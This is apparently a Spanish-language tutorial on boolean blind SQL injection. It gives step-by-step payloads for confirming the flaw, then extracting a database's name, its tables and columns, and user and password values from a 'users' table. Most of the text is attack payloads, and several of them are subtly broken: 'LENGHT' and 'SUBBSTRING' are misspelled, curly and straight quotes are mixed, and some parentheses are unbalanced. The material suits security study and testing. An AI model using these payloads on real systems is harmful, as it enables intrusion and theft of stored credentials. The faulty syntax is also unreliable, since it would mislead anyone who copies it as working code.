# BOOLEAN BLIND SQLI

## **DETERMINAR EL NOMBRE DE LA BASE DE DATOS CON BOOLEAN BLIND SQL INJECTION**

En este caso, al poner una comilla simple \('\) la web no me da error, por lo que no puedo saber si me encuentro ante un SQL Injection.

 **1.** Comprobamos el funcionamiento normal de la aplicacion.

 **2.** Para comprobar si es vulnerable a SQL Injection, lanzo un valor valido y una declaracion Verdadera o, al reves, un valor invalido O una declaracion verdadera.

 **`1 ' AND 1=1 -- -`**

 **`0 ' OR 1=1 -- -`**

 **3.** El problema es que el resultado de la llamada no es visible por lo que va a llevar mucho mas tiempo obtener la informacion necesaria. Existen 3 metodos:

###  **1 Adivinar la base de datos**

 Es el mas complicado ya que debemos saber el nombre de la base de datos o imaginarlo.

 **1.** Vamos a determinar la longitud del nombre de la base de datos:

 **`1 ' AND LENGHT(database())=10 -- -`**

 Como 1 es TRUE, si me da FALSE es que la longitud no es 10. Probamos hasta que obtenemos el numero que corresponde. \(4 por ejemplo\)

**2.** Ahora que sabemos que tiene 4 caracteres, hay que adivinar cual es esa palabra de 4 caracteres.

 **`1 ‘ AND SUBSTRING(database(),1,4) = ’root' -- -`**

 Si pruebo con root y me da FALSE es que no es esa la string que buscamos. Si da TRUE, vamos bien, esa es la Base de Datos que Buscamos.

###  **2 Adivinar letra por letra**

 De esta manera solo vamos a necesitar reiterar hasta conseguir sacar el nombre de la base de datos, pero es 100% efectivo:

 **`1 ‘ AND SUBSTRING(database(),1,1) = ’a' -- -`**

 Habria que enviar ese PAYLOAD pasando por todas las letras del abecedario hasta que nos da TRUE. \(primera letra = d\)

 **`1 ‘ AND SUBBSTRING(database(),2,1) = ’a' -- -`** \(segunda letra = v\)

 **`1 ‘ AND SUBBSTRING(database(),3,1) = ’a' -- -`** \(tercera letra = w\)

 **`1 ‘ AND SUBBSTRING(database(),4,1) = ’a' -- -`** \(cuarta letra = a\)

###  **3 Analizar el valor de la tabla ASCII de la base de datos**

 Este es el metodo mas rapido y sencillo para llegar a nuestro objetivo:

 **`1 ' AND ASCII(SUBSTRING(database(),1,1)) >= 65 AND 1 ' AND ASCII(SUBSTRING(database(),1,1)) <= 122 -- -`**

 Voy reduciendo el rango hasta que vaya dando con la letra correcta. Utilizo prueba y error hasta que dejo un rango muy estrecho para empezar a comparar con iguales.

 Hacemos lo mismo con el resto de letras y obtenemos el nombre de la Base de Datos.

##  **DETERMINAR LAS TABLAS CON BOOLEAN BLIND SQL INJECTION**

 Si recordamos de antes, las tablas las podiamos obtener en un SQL injection de la siguiente manera:

 **`SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1`**

 El anterior Query nos permite obtener el segundo resultado de las tablas de la database\(\)

 Pero ahora lo tengo que obtener analizando los valores ASCII, por tanto, tengo que hacer lo siguiente:

 **`1 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 1,1),1,1) > 10`**

 De esta manera analizo los valores de la primera letra de la TABLA hasta que lo consigo y asi sucesivamente.

##  **DETERMINAR LAS COLUMNAS CON BOOLEAN BLIND SQL INJECTION**

 De la misma manera que hemos hecho antes, monto el PAYLOAD para obtener las letras de la columna.

**`1 ‘ AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' limit 3,1),1,1) > 10`**

 Esto se vuelve muy laborioso si no sabemos cual es la estructura de la tabla y no sabemos cual es la columna que queremos.

 con limit 3,1 obtenemos la columna 4 de la tabla.

##  **EXTRAER DATOS DE LA BASE DE DATOS CON BOOLEAN BLIND SQL INJECTION**

 Por ultimo, ya solo quedaria obtener los datos de las columnas.

 **`1 ‘ AND ASCII(SUBSTRING((SELECT user FROM users limit 0,1),1,1) > 10`**

 Ya con todos los datos, solo intentamos sacar el primer CAMPO de la COLUMNA user de la TABLA users

 Como ya hemos hecho con todos los anteriores, toca hacer trabajo de chino extrayendo letra por letra el user.

 **`1 ‘ AND ASCII(SUBSTRING((SELECT password FROM users limit 0,1),1,1) > 10`**

 Despues habria que hacer lo mismo para obtener los datos de la password.

